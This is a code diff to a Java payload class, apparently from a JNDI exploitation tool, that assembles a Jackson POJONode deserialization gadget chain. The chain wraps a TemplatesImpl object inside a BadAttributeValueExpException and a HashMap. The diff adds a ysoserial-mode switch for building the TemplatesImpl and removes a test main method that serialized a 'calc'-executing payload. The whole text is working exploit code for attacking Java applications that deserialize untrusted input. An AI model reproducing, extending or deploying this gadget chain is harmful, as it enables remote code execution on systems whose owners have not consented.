@@ -3,6 +3,7 @@ package com.qi4l.jndi.gadgets;
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import com.qi4l.jndi.gadgets.utils.Serializer;
 import javassist.ClassPool;
@@ -14,11 +15,18 @@ import java.io.ByteArrayOutputStream;
 import java.util.Arrays;
 import java.util.HashMap;
 
+import static com.qi4l.jndi.Starter.cmdLine;
+
 public class Jackson implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        final Object template = Gadgets.createTemplatesImpl(type, param);
+        final Object template;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            template = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            template = Gadgets.createTemplatesImpl(type, param);
+        }
 
         ClassPool pool = ClassPool.getDefault();
         //pool.insertClassPath(new ClassClassPath(Class.forName("com.fasterxml.jackson.databind.node.BaseJsonNode")));
@@ -37,13 +45,5 @@ public class Jackson implements ObjectPayload<Object> {
         hashMap.put(template, badAttributeValueExpException);
 
         return hashMap;
-    }
-
-    public static void main(String[] args) throws Exception {
-        ObjectPayload payload = Jackson.class.newInstance();
-        Object                object = payload.getObject(PayloadType.qi4l, "calc");
-        ByteArrayOutputStream out    = new ByteArrayOutputStream();
-        byte[]                bytes  = Serializer.serialize(object, out);
-        System.out.println(Arrays.toString(bytes));
     }
 }
